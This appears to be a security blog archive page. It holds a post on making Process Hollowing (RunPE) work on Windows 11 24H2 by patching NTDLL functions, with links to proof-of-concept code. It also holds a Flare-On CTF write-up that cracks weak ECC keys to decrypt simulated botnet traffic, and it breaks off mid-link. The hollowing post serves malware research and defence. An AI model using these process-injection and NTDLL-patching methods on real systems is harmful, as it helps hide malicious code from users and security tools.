\[1\] [“Unpacking with Anthracene”](https://forum.tuts4you.com/files/file/2040-unpacking-with-anthracene/) \[mirror: [Unpacking With Anthracene.zip](https://drive.google.com/file/d/13Bnw0AvIsJmezuJl31EhGmzNZYDitErw/view?usp=sharing), pass: `tuts4you`\],

Posted in [Malware](https://hshrzd.wordpress.com/category/malware/), [Tools](https://hshrzd.wordpress.com/category/tools/), [Tutorial](https://hshrzd.wordpress.com/category/tutorial/)\|Tagged [HollowsHunter](https://hshrzd.wordpress.com/tag/hollowshunter/), [PE-bear](https://hshrzd.wordpress.com/tag/pe-bear/), [PE-sieve](https://hshrzd.wordpress.com/tag/pe-sieve/), [TinyTracer](https://hshrzd.wordpress.com/tag/tinytracer/)\|[Leave a comment](https://hshrzd.wordpress.com/2025/03/22/unpacking-executables-with-tinytracer-pe-sieve/#respond)

## [Process Hollowing on Windows 11 24H2](https://hshrzd.wordpress.com/2025/01/27/process-hollowing-on-windows-11-24h2/)

Posted on [January 27, 2025](https://hshrzd.wordpress.com/2025/01/27/process-hollowing-on-windows-11-24h2/ "12:16 am") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

[Process Hollowing (a.k.a. RunPE)](https://attack.mitre.org/techniques/T1055/012/) is probably the oldest, and the most popular process impersonation technique (it allows to run a malicious executable under the cover of a benign process). It is used in variety of PE loaders, PoCs, and offensive tooling. It was also used in one of the demos involving my library, [libPEconv](https://github.com/hasherezade/libpeconv). Recently I’ve got a [github issue from a user complaining that the demo no longer works on the latest Windows 11, 24H2](https://github.com/hasherezade/libpeconv/issues/59) . This [Windows release was published **October 1, 2024**](https://en.wikipedia.org/wiki/Windows_11,_version_24H2), so it is still fresh, but slowly gaining popularity. Searching for the solution I found out, that many people encountered the same problem with different implementations of RunPE, and it is a problem with the technique itself. Still, the answers that I found were not really reaching the root of the problem, so I decided to investigate it deeper. In this short blog I describe my findings, in hopes that it will help other people who experienced the same issue.

## The observed error: 0xc0000141

After the PE was implanted into the newly created, suspended process, we resume the process, and the implant is supposed to load, using the typical Windows loader mechanism. However, when we resume the 64-bit process on Windows 11 24H2, the loading will get interrupted with an error: 0xC0000141.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/01/run_pe_fai.jpeg?w=606)

## The root cause

This problem comes from changes that were implemented in the Windows loader.

The implementation of Run PE involves loading the payload into the newly allocated memory. Depending on the variant of the technique, it may be implemented in two ways:

- unmapping the original PE, allocating memory at exactly the same address, and writing the implant there
- allocating a new memory region, writing the implant there, then setting the new region as a base address of the main module in the PEB structure

In both cases, the new PE is stored in the private memory (MEM\_PRIVATE), unlike the normally mapped PE, which would be stored as image (MEM\_IMAGE). This is going to make a big difference further on.

Windows 11 24H2 added a native support for Hotpatching (see the details [here](https://ynwarcs.github.io/Win11-24H2-CFG)). It caused some changes at process initialization, such as, a new function, `RtlpInsertOrRemoveScpCfgFunctionTable` has been added ( [see under “extras”](https://ynwarcs.github.io/Win11-24H2-CFG)). The subsequent functions are called:

LdrpInitializeProcess -> LdrpProcessMappedModule -> RtlpInsertOrRemoveScpCfgFunctionTable -> ZwQueryVirtualMemory

The function `ZwQueryVirtualMemory` is meant to retrieve the properties of each module in memory. It is called with the new argument [`MemoryImageExtensionInformation`](https://ntdoc.m417z.com/memory_information_class) that can be used only on images (MEM\_IMAGE). Since the implanted PE is not an image, but MEM\_PRIVATE, the function fails will the error (STATUS\_INVALID\_ADDRESS).

This further causes the loading to terminate with the observed error.

## The solution

There are two approaches with which we can solve this problem:

1. Use alternative technique, that stores the implant as MEM\_IMAGE, instead of MEM\_PRIVATE
2. Patch the NTDLL to bypass the check

### Alternative techniques

While RunPE is still the most known and popular process impersonation technique, in the meantime, multiple alternatives evolved, using which we can map our implant as MEM\_IMAGE rather than MEM\_PRIVATE.

There is a group of techniques that create a section first (using `NtCreateSection`), and then create the process from the section, using the native API `NtCreateProcessEx`. This group contains the following techniques:

- [Process Doppelganging](https://www.youtube.com/watch?v=Cch8dvp836w) ( [PoC](https://github.com/hasherezade/process_doppelganging?tab=readme-ov-file))
- [Process Ghosting](https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack) ( [PoC](https://github.com/hasherezade/process_ghosting))
- Process Herpaderping ( [PoC](https://github.com/jxy-s/herpaderping))

However, this group of techniques is not as convenient to use as the classic RunPE. It involves filling a lot of structures manually. Another problem is, the process will distinguish itself from the normally created one, since it is created from an unnamed module (`GetProcessImageFileName` returns an empty string). This does not happen in case of RunPE. So, although they are a nice addition to the arsenal of techniques, they don’t make a perfect replacement of the classic.

With time more options for process impersonation appeared. Process Doppelganging and Process Ghosting inspired hybrid techniques, that are closer in their implementation to the Process Hollowing, yet, contain the major improvement of using the PE mapped as MEM\_IMAGE. Those hybrids are:

- [Transacted Hollowing](https://www.malwarebytes.com/blog/news/2018/08/process-doppelganging-meets-process-hollowing_osiris) ( [PoC](https://github.com/hasherezade/transacted_hollowing))
- Ghostly Hollowing ( [PoC](https://github.com/hasherezade/transacted_hollowing))
- Herpaderply Hollowing ( [PoC](https://github.com/Hagrid29/herpaderply_hollowing))

In case of those techniques, `GetProcessImageFileName` returns the target’s path, and the process resembles more the one that is loaded normally. The payload is mapped as unnamed MEM\_IMAGE.

Later, I came up with one more variant of the loader, that would map the payload as named MEM\_IMAGE, making it yet more similar to a legitimately loaded PE. Details of the implementation, and comparison to other techniques, can be found in the repository:

- Process Overwriting \[ [PoC](https://github.com/hasherezade/process_overwriting)\], \[ [FAQ](https://github.com/hasherezade/process_overwriting/wiki)\]

According to my latest tests, Transacted/Ghostly Hollowing, as well as Process Overwriting, successfully loaded PEs on Windows 11 24H2, without the need of any additional changes or patches.

Demo (Process Overwriting on Windows 11 24H2):

### Patching NTDLL

If, for whatever reason, we insist to use the original RunPE, and run our payload from MEM\_PRIVATE, it is still possible to achieve it. However, it will require patching of the function that causes the error (`ZwQueryVirtualMemory`). Of course we want the patch to have minimal impact on the rest of the execution, so it has to filter only one particular case when we are making a query about the specific memory region containing our payload.

First, we check if our loaded is running on Windows 11 24H2 or higher, because lower versions don’t have this problem. Also, only the 64-bit processes should be affected.

The functionality of the patch can be described by the following pseudocode:

- if MEMORY\_INFORMATION\_CLASS != MemoryImageExtensionInformation -> call the original `ZwQueryVirtualMemory`
- if ImageBase != implant\_ptr -> call the original `ZwQueryVirtualMemory`
- otherwise – return with a benign error: STATUS\_NOT\_SUPPORTED

The full implementation of the patch can be found here:

[https://github.com/hasherezade/libpeconv/blob/master/run\_pe/patch\_ntdll.cpp#L91](https://github.com/hasherezade/libpeconv/blob/master/run_pe/patch_ntdll.cpp#L91)

As a result, loading of our implant won’t be interrupted, and we can enjoy having Process Hollowing on Windows 11 24H2!

## The observed error: 0xC00004AC

Still, even after we resolved the first issue by the patch on `ZwQueryVirtualMemory`, on some systems another error may occur, with a different code. This time it is 0xC00004AC.

We will encounter it on Windows 11 24H2 with Memory Integrity enabled:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/01/protection.png?w=885)

## The root cause

1. `LdrpQueryCurrentPatch` is called on the implant (address in red):

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/01/query_patch1.png?w=1024)

2\. The function NtManageHotPatch exits with an error `STATUS_CONFLICTING_ADDRESSES`:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/01/query_patch_err.png?w=1024)

This further causes the loading to terminate with the observed error.

## The solution

Just like in the previous case, the alternative techniques are the best option – they work out of the box, without any patches to be applied. However, if we want to stick to the classic Process Injection, there is another patch to apply on NTDLL: this time on `NtManageHotPatch` function. In this simple example, I decided to remove the function altogether. The call exits immediately, with a benign error: `STATUS_NOT_SUPPORTED`.

In this case we need to apply it for both 32, and 64 bit applications.

32-bit: [https://github.com/hasherezade/libpeconv/blob/master/run\_pe/patch\_ntdll.cpp#L4](https://github.com/hasherezade/libpeconv/blob/master/run_pe/patch_ntdll.cpp#L4)

64-bit: [https://github.com/hasherezade/libpeconv/blob/master/run\_pe/patch\_ntdll.cpp#L43](https://github.com/hasherezade/libpeconv/blob/master/run_pe/patch_ntdll.cpp#L43)

The function `NtManageHotPatch` is used since early stages of process initialization. That’s why it is best to apply patch soon after process creation. If we do it later, we must ensure that the instruction cache was flushed (`FlushInstructionCache`), otherwise the cached version of the function may be executed instead.

After that, the Process Hollowing should work even if Memory Integrity is enabled.

# Complete PoC

[https://github.com/hasherezade/libpeconv/tree/master/run\_pe](https://github.com/hasherezade/libpeconv/tree/master/run_pe)

Posted in [Malware](https://hshrzd.wordpress.com/category/malware/), [Programming](https://hshrzd.wordpress.com/category/programming/), [Techniques](https://hshrzd.wordpress.com/category/techniques/)\|Tagged [processhollowing](https://hshrzd.wordpress.com/tag/processhollowing/), [processinjection](https://hshrzd.wordpress.com/tag/processinjection/), [Programming](https://hshrzd.wordpress.com/tag/programming/), [runpe](https://hshrzd.wordpress.com/tag/runpe/)\|[4 Comments](https://hshrzd.wordpress.com/2025/01/27/process-hollowing-on-windows-11-24h2/#comments)

## [Flare-On 11 – Task 7](https://hshrzd.wordpress.com/2024/12/09/flare-on-11-task-7/)

Posted on [December 9, 2024](https://hshrzd.wordpress.com/2024/12/09/flare-on-11-task-7/ "2:31 am") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_[Flare-On](https://flare-on.com/) is an annual CTF run by [Mandiant Flare Team](https://cloud.google.com/blog/topics/threat-intelligence/flareon-11-challenge-solutions). In this series of writeups I present solutions to some of my favorite tasks from this year. All the sourcecodes are available on my Github, in dedicated repository: [flareon2024](https://github.com/hasherezade/flareon2024)_.

Task 7 comes with the following description:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/task7_desc.png?w=716)

We are provided with a PCAP, and a PE binary. At this point we can guess that the binary has generated the traffic saved in the PCAP, and we are supposed to decrypt it.

## Overview

#### The PCAP

The PCAP contains TCP traffic between two machines, represented by LAN addresses: 192.168.56.101 and 192.168.56.103.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/connection.png?w=1024)

The communication is an exchange of small data portions of various lengths, each of them is encrypted.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/tcp_stream.png?w=600)

#### The PE

I started the analysis from examining the executable with PE-bear. Even at the first look, the binary seems a bit atypical. Although in the task description it is mentioned that we will be dealing with a .NET binary, the file that we’ve got seems to be compiled to a native code…

Among the sections we can see some interesting names, that are not common for natively compiled binaries, such as `.managed` and `.hydrated`. The `.hydrated` section is unpacked dynamically in memory:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/sections.png?w=1024)

The export table has one entry: `DotNetRuntimeDebugHeader`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/export_table.png?w=560)

The PE is very bulky, and it is clear that it has been statically linked with some libraries.

Googling for those atypical artifacts lead me to the great article, that explained in good details what I am dealing with, and how to proceed: [https://harfanglab.io/insidethelab/reverse-engineering-ida-pro-aot-net/](https://harfanglab.io/insidethelab/reverse-engineering-ida-pro-aot-net/). So, it is a an AOT (Ahead Of Time compiled) .NET binary.

## Resolving functions by FLIRT signatures

The [article about AOT analysis](https://harfanglab.io/insidethelab/reverse-engineering-ida-pro-aot-net/) provides [a basic set of FLIRT signatures that can be used to makes sense out of the code](https://harfanglab.io/medias/2024/01/net_aot_7_0_1423.zip).

Before applying the signatures, the code is very convoluted, and hard to grasp:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/main_before.png?w=827)![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/managed_main_before.png?w=464)

After applying all the signatures, we can see much clearer picture of what is going on:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/main_after_signs.png?w=644)![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/after_signatures_main.png?w=746)

### Creating custom signatures

Although the found signatures help to clarify a lot what is going on, they are not sufficient. There are still plenty of function that haven’t been identified. To really make sense out of the code, we need to identify the libraries with which the task was compiled, and prepare our own signatures with a proper coverage.

As we know from the previous overview, the file `.hydrated` section is unpacked in memory. So, I decided to dump the executable with [PE-sieve,](https://github.com/hasherezade/pe-sieve/) to have this section saved in the binary that I am analyzing. Inside this section I found [some strings that suggest that the BouncyCastle](https://gist.github.com/hasherezade/a5b9aebae9f3e07743a4b9b2da91a98c#file-hydrated-txt-L959) cryptographic library has been used (and other strings belonging to various cryptographic functions).

Example:

|     |     |
| --- | --- |
| 1<br>2 | `Org.BouncyCastle.EC.Fp_Certainty`<br>`Org.BouncyCastle.EC.Fp_MaxSize` |

To create the relevant signatures for Bouncy Castle, I had to first create an AOT compiled .NET project with the Bouncy Castle library incorporated. The creation of AOT project, and generating signatures out of it, is very well documented in [the tutorial that I mentioned earlier](https://harfanglab.io/insidethelab/reverse-engineering-ida-pro-aot-net/).

#### Creating and publishing the AOT project

To create an AOT project, we need at least Visual Studio 2022. Upon creating a new .NET project, the option enabling AOT publishing has to be selected.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/aot_project.png?w=587)

The project can then be compiled to the typical .NET binary, or to the AOT binary. In order to generate an AOT binary we need to “Publish” it.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/publish_button.png?w=320)

It then requires us to fill settings of where an in which form the code should be published. Our target has to be compatible with the sample that we are analyzing. Once we filled all the settings (as on the picture), we need to click the “Publish” button. If everything went fine, the build will be saved to our predefined path.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/publish_settings.png?w=896)

Of course the goal is to create an executable that contains all the functions from the BouncyCastle library that our analyzed sample has, so that we can further identify them. At this point I don’t know yet what those functions are, but strings from the `.hydrated` section give some hints. We also need the functions related to the network communication.

To create an example with the Bouncy Castle library, I used some snippets from: [https://asecuritysite.com/csharp](https://asecuritysite.com/csharp/bc_ec02) (i.e. [https://asecuritysite.com/csharp/bc\_ec02](https://asecuritysite.com/csharp/bc_ec02) ). It was kind of a trial and error, collecting and applying various signatures until the code was clarified enough with them.

I used the latest version of Bouncy Castle, added to the project via NuGet:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/nuget.png?w=356)

Several different versions are available to select, so sometimes it takes some trial and error to find out which one fits:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/bouncy_library.png?w=648)

This way, we get an AOT binary with Bouncy Castle, compiled with symbols. Now we can load it into IDA, and generate the FLIRT signatures out of those symbols.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/create_sig_file.png?w=773)

Saving the SIG file:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/make_sig.png?w=534)

The results then can be applied into the IDB of the `fullspeed` executable (I used the dump with the hydrated section unpacked, instead of the original version).

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/load_sig.png?w=713)

This should give us some of the Bouncy Castle functions resolved:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/bouncy_functions.png?w=772)

I did several iterations with different code snippets, till all needed functions got covered.

The cleaned code after applying the Bouncy Castle Signatures: `code.cs`

## Static analysis

Analyzing the deobfuscated binary, we can see that we are dealing here with Elliptic Curve Cryptography. The curve is first initialized with the hardcoded parameters:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/init_curve-1.png?w=890)

The server and the client generate a keypair, and perform a [Diffie-Hellman Key exchange](https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman). Before being sent, each of the coordinates is obfuscated by XOR with a hardcoded key (`1337...`).

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/init_and_send_coordinates.png?w=765)

They calculate a shared secret, which is then used for the symmetric crypto (ChaCha20) initialization. The rest of the traffic is encrypted with the symmetric crypto only. The ChaCha20 algorithm uses 32-byte long key, and 8-byte nonce.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/chacha_use.png?w=752)

The first message, received from the server after the key exchange, is supposed to be the keyword ‘verify’. It is ChaCha20 encrypted with the key that was derived from the shared secret. If the message was successfully decrypted, the executable will follow into another function, that processes some received commands in a loop, executing them and sending back the results. So, the crackme is made to resemble a botnet agent, exfiltrating data from the infected machine.

## The goal of the task

At this point, the goal of the task becomes clear.

We know that a new ECC keypair is generated for each session, so the private keys that were used to encrypt the traffic are irreversibly lost. However, we can find the exchanged public keys in the provided PCAP. As the task description announced, there is some cryptoanalysis to do – so we are most likely supposed to recover the private keys, by finding some cryptographic flaw.

## Dynamic analysis

Dynamic analysis always helps checking the assumptions, and filling in any possible inaccuracies in the understanding. So I thought it will be the best to let the sample connect to my own emulated server, written in Python, to observe how the communication proceeds.

From the PCAP, and also by doing some experiments with ProcMon, we can see the IP where the sample connects (IP: `192.168.56.103`, port: `31337`)

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/conn.png?w=677)

It is an address within LAN range. So, it is possible to adjust the VM settings to use exactly this IP for the current machine.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/setup.png?w=546)

After those adjustments, I created a server for tests. The [first version](https://gist.github.com/hasherezade/10b09ca1c30a61a62056aa68395eef21) was just sending the data from the PCAP to the sample. In the meanwhile that I was observing the sample under the debugger, to check how it processes the obtained data. It allowed me to make sure how exactly the keys are parsed and stored in memory.

## Cracking the ECC private keys

At this point I had [all the parameters used to initialize the curve](https://github.com/hasherezade/flareon2024/blob/main/task7/code.cs#L19). The public keys, for the client and the server are in the PCAP, and we just need to deobfuscate them using the hardcoded XOR key. The result:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16 | `# definition of the curve:`<br>`q``=``0xc90102faa48f18b5eac1f76bb40a1b9fb0d841712bbe3e5576a7a56976c2baeca47809765283aa078583e1e65172a3fd`<br>`a``=``0xa079db08ea2470350c182487b50f7707dd46a58a1d160ff79297dcc9bfad6cfc96a81c4a97564118a40331fe0fc1327f`<br>`b``=``0x9f939c02a7bd7fc263a4cce416f4c575f28d0c1315c4f0c282fca6709a5f9f7f9c251c9eede9eb1baa31602167fa5380`<br>`# generator coordinates (hardcoded):`<br>`G_x``=``0x087b5fe3ae6dcfb0e074b40f6208c8f6de4f4f0679d6933796d3b9bd659704fb85452f041fff14cf0e9aa7e45544f9d8`<br>`G_y``=``0x127425c1d330ed537663e87459eaa1b1b53edfe305f6a79b184b3180033aab190eb9aa003e02e9dbf6d593c5e3b08182`<br>`# server coordinates (from PCAP)`<br>`s_x``=``0xb3e5f89f04d49834de312110ae05f0649b3f0bbe2987304fc4ec2f46d6f036f1a897807c4e693e0bb5cd9ac8a8005f06`<br>`s_y``=``0x85944d98396918741316cd0109929cb706af0cca1eaf378219c5286bdc21e979210390573e3047645e1969bdbcb667eb`<br>`# client coordinates (from PCAP)`<br>`k_x``=``0x195b46a760ed5a425dadcab37945867056d3e1a50124fffab78651193cea7758d4d590bed4f5f62d4a291270f1dcf499`<br>`k_y``=``0x357731edebf0745d081033a668b58aaa51fa0b4fc02cd64c7e8668a016f0ec1317fcac24d8ec9f3e75167077561e2a15` |

We can also observe under the debugger how the new session key is being generated. It is 128 bit random number.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/make_session_key.png?w=773)

Probably the best tool for cryptography-related experimentation, and for verifying assumptions on the way, is [Sage Math](https://www.sagemath.org/). So it was also my tool of choice.

Now is the hard part – we need to find the flaw in the Elliptic Curve implementation. This part can be very overwhelming for everyone who doesn’t have enough mathematical background related to cryptoanalysis, and I must also admit that I suffered through it several days, and couldn’t avoid taking a hint.

The best resource that I was able to get detailing different attacks is [Eli Kaski’s ECC guide](https://digitalwhisper.co.il/files/Zines/0xA6/DW166-1-ElipticCurvesAttacks.pdf) (now [available on his Github](https://github.com/elikaski/ECC_Attacks) in English). The guide provides a very clear explanation of common attacks, and an example code in Sage Math for each of them.

### Finding the suitable attack

By checking the order of the curve we find out that it is 384 bits, and it is a composite. Let’s split it into the primes with the help of Sage Math [script](https://gist.github.com/hasherezade/4353f7c2af102797fcf61c3a0bbba3c6). It turns out that most of them are small, adding up to 128 bits – only one of the primes is much bigger then others: 272-bit long.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12 | `$ sage check.sage`<br>``<br>`number of bits in n: 384`<br>`n's factors: 35809 * 46027 * 56369 * 57301 * 65063 * 111659 * 113111 * 7072010737074051173701300310820071551428959987622994965153676442076542799542912293`<br>`factor: 35809   bits: 16`<br>`factor: 46027   bits: 16`<br>`factor: 56369   bits: 16`<br>`factor: 57301   bits: 16`<br>`factor: 65063   bits: 16`<br>`factor: 111659  bits: 17`<br>`factor: 113111  bits: 17`<br>`factor: 7072010737074051173701300310820071551428959987622994965153676442076542799542912293  bits: 272` |

The random secret key is 128-bit long – so it is too short for the order of this curve. It fits the conditions that should make it crackable by the [Pohlig-Hellman algorithm](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm) (involving the [Chinese Reminder Theorem](https://en.wikipedia.org/wiki/Chinese_remainder_theorem)) that was described in Eli’s paper, [here](https://github.com/elikaski/ECC_Attacks?tab=readme-ov-file#the-order-of-the-generator-is-almost-a-smooth-number-and-the-private-key-is-small). However, [applying the basic implementation of this algorithm](https://gist.github.com/hasherezade/30621357bf5f2b578a40595a423a0d0b), as is in the paper, makes the script run forever and does not bring any results…

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/omg-wtf.gif?w=498)

### Tweaking the solution

It turns out that we are not able to crack the whole key the same way as demonstrated in the paper. But still, we can get close enough to the desired result, and then brutforce the rest of the key.

First we need to reject the longest factor (that is 272-bit long), and keep only the small ones.

|     |     |
| --- | --- |
| 1<br>2<br>3 | `factors = n.factor()`<br>`factors = list(filter(lambda x: int(x[0]^x[1]).bit_length() < PRIVATE_KEY_BIT_SIZE, factors))`<br>`print("n's factors:", factors)` |

That leaves us with:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5 | `Factors:`<br>`[(35809, 1), (46027, 1), (56369, 1), (57301, 1), (65063, 1), (111659, 1), (113111, 1)]`<br>`Subgroup:`<br>`[35809, 46027, 56369, 57301, 65063, 111659, 113111]` |

With [this modification](https://gist.github.com/hasherezade/41a82910556f4625cd5e285fef902254), we will find a partial key, that is up to 112-bit long. The full private key is 128- bit long, that means, 16-bits still need to be found.

What we are missing to be added to our key, is a product of [the subgroup](https://gist.github.com/hasherezade/41a82910556f4625cd5e285fef902254#file-partial-sage-L38) multiplied by some unknown number. So, all we need to do is to find this number.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16 | `# calculate the product of the subgroup`<br>`product``=``subgroup[``0``]`<br>`for``i``in``range``(``1``,``len``(subgroup)):`<br>```product``*``=``subgroup[i]`<br>`# add the product of the subgroup to the partial key,`<br>`# till it fits the equation:`<br>`print``(``"Brutforcing missing bits..."``)`<br>`is_found``=``False`<br>`while``True``:`<br>```found_key``+``=``product`<br>```if``(found_key``*``G``=``=``P):`<br>```print``(``"Found!"``)`<br>```print``(found_key)`<br>```is_found``=``True`<br>```break` |

This is the full demo script: [test.sage](https://github.com/hasherezade/flareon2024/blob/main/task7/test.sage) – that shows that this approach indeed works, and can reconstruct any randomly generated private key for this curve.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16 | `$ sage test.sage`<br>`Number of bits in n: 384`<br>`Generated random private key:`<br>`87132562555323560766071773796861070843`<br>`We know that the private key is 128 bits long`<br>`Lets find which of the factors of G's order are relevant for finding the private key`<br>`Considering these factors: [(35809, 1), (46027, 1), (56369, 1), (57301, 1), (65063, 1), (111659, 1), (113111, 1)]`<br>`Calculating discrete log for each quotient group...`<br>`Running CRT...`<br>`Partial key: 3312227813454345064930306402450050`<br>`Len:  112`<br>`Brutforcing missing bits...`<br>`Found!`<br>`87132562555323560766071773796861070843`<br>`success!` |

Now we just need to apply the data from the task.

In the demo, the point P was calculated by multiplying the random private key with the G, that was the point on the curve used in the initialization.

|     |     |
| --- | --- |
| 1<br>2<br>3 | `E = EllipticCurve(GF(p), [a, b])`<br>`G = E(G_x, G_y)`<br>`P = private_key * G` |

Now we don’t have the private key, but we can calculate the same P from the data from the PCAP. We have a keypair of the server and the keypair of the client. Each of them define the point P on the curve, and each of them can be used to crack, appropriately, the private key of the client, or the private key of the server.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7 | `# points defining the public key of the client (from the PCAP):`<br>`k_x``=``0x195b46a760ed5a425dadcab37945867056d3e1a50124fffab78651193cea7758d4d590bed4f5f62d4a291270f1dcf499`<br>`k_y``=``0x357731edebf0745d081033a668b58aaa51fa0b4fc02cd64c7e8668a016f0ec1317fcac24d8ec9f3e75167077561e2a15`<br>`E``=``EllipticCurve(GF(p), [a, b])`<br>`G``=``E(G_x, G_y)`<br>`P``=``E(k_x, k_y)` |

The rest of the script remains the same as in the demo. The resulting solution ( [solution.sage](https://github.com/hasherezade/flareon2024/blob/main/task7/solution.sage)).

Having any of the private keys is enough to decrypt the traffic, but I decided to crack both of them. The results:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | `# Server Private: 153712271226962757897869155910488792420`<br>```(0x73a3e816c7642f57e6bd4c6079a19d64)`<br>`# Client Private: 168606034648973740214207039875253762473`<br>```(0x7ed85751e7131b5eaf5592718bef79a9)` |

## Decrypting the traffic

Having the private key of the client calculated (0x7ed85751e7131b5eaf5592718bef79a9), I simply set the breakpoint in code in the place just after the random key was generated, and substituted the content of the key in memory. I made a use of the knowledge on how the BigInt is stored in memory, which I figured out by doing some dynamic analysis earlier:

|     |     |
| --- | --- |
| 1<br>2 | `Client private key (as BigInt)`<br>`51 57 D8 7E 5E 1B 13 E7 71 92 55 AF A9 79 EF 8B` |

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/replace_value.png?w=590)

The emulated Python server was configured in such a way, that it was sending the Server Public Key the same as in PCAP ( [server.py](https://github.com/hasherezade/flareon2024/blob/main/task7/server.py)). So, having the client private key, and the server public key combined together, the calculated shared secret is going to be the identical as in the scenario that the PCAP registered.

Under debugger, I followed the code till the point where the ChaCha20 key was derived, and dumped this key and the nonce.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12 | `Block to derive Chacha:`<br>`B4 8F 8F A4 C8 56 D4 96 AC DE CD 16 D9 C9 4C C6`<br>`B0 1A A1 C0 06 5B 02 3B E9 7A FD D1 21 56 F3 DC`<br>`3F D4 80 97 84 85 D8 18 3C 09 02 03 B6 D3 84 C2`<br>`0E 85 3E 1F 20 F8 8D 1C 5E 0F 86 F1 6E 6C A5 B2`<br>`Chacha20 key:`<br>`B4 8F 8F A4 C8 56 D4 96 AC DE CD 16 D9 C9 4C C6`<br>`B0 1A A1 C0 06 5B 02 3B E9 7A FD D1 21 56 F3 DC`<br>`Chacha20 nonce:`<br>`3F D4 80 97 84 85 D8 18` |

We can confirm that after filling in appropriate Client Private key, the “verify” keyword from the PCAP got decrypted:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/verify_decrypted.png?w=581)

And the emulated server received the client coordinates that are exactly the same as the one in the PCAP:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/server_key_exchange.png?w=962)

So at this point we have it confirmed that the cracked private key is correct. We are ready to decrypt the traffic!

One more thing that we need to keep in mind is that ChaCha20 is initialized only once, and then the same stream is used through the execution. So we need to decrypt the whole traffic as one data block. The ChaCha20 encrypted traffic starts just after the key exchange:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/12/chacha_stream.png?w=906)

Having all the needed data, we can use [CyberChef to decrypt it](https://gchq.github.io/CyberChef/#recipe=ChaCha(%7B'option':'Hex','string':'B4%208F%208F%20A4%20C8%2056%20D4%2096%20AC%20DE%20CD%2016%20D9%20C9%204C%20C6%20B0%201A%20A1%20C0%2006%205B%2002%203B%20E9%207A%20FD%20D1%2021%2056%20F3%20DC'%7D,%7B'option':'Hex','string':'3F%20D4%2080%2097%2084%2085%20D8%2018'%7D,0,'20','Hex','Raw')&input=ZjI3MmQ1NGMzMTg2MGYKM2ZiZDQzZGEzZWUzMjUKODZkZmQ3CmM1MGNlYTFjNGFhMDY0YzM1YTdmNmUzYWIwMjU4NDQxYWMxNTg1YzM2MjU2ZGVhODNjYWM5MzAwN2EwYzNhMjk4NjRmOGUyODVmZmE3OWM4ZWI0Mzk3NmQ1YjU4N2Y4ZjM1ZTY5OTU0NzExNgpmY2IxZDJjZGJiYTk3OWM5ODk5OThjCjYxNDkwYgpjZTM5ZGEKNTc3MDExZTBkNzZlYzhlYjBiODI1OTMzMWRlZjEzZWU2ZDg2NzIzZWFjOWYwNDI4OTI0ZWU3Zjg0MTFkNGM3MDFiNGQ5ZTJiMzc5M2Y2MTE3ZGQzMGRhY2JhCjJjYWU2MDBiNWYzMmNlYTE5M2UwZGU2M2Q3MDk4MzhiZDYKYTdmZDM1CmVkZjBmYwo4MDJiMTUxODZjN2ExYjFhNDc1ZGFmOTRhZTQwZjZiYjgxYWZjZWRjNGFmYjE1OGE1MTI4YzI4YzkxY2Q3YTg4NTdkMTJhNjYxYWNhZWMKYWVjOGQyN2E3Y2YyNmExNzI3MzY4NQozNWE0NGUKMmYzOTE3CmVkMDk0NDdkZWQ3OTcyMTljOTY2ZWYzZGQ1NzA1YTNjMzJiZGIxNzEwYWUzYjg3ZmU2NjY2OWUwYjQ2NDZmYzQxNmMzOTljM2E0ZmUxZWRjMGEzZWM1ODI3Yjg0ZGI1YTc5YjgxNjM0ZTdjM2FmZTUyOGE0ZGExNTQ1N2I2Mzc4MTUzNzNkNGVkY2F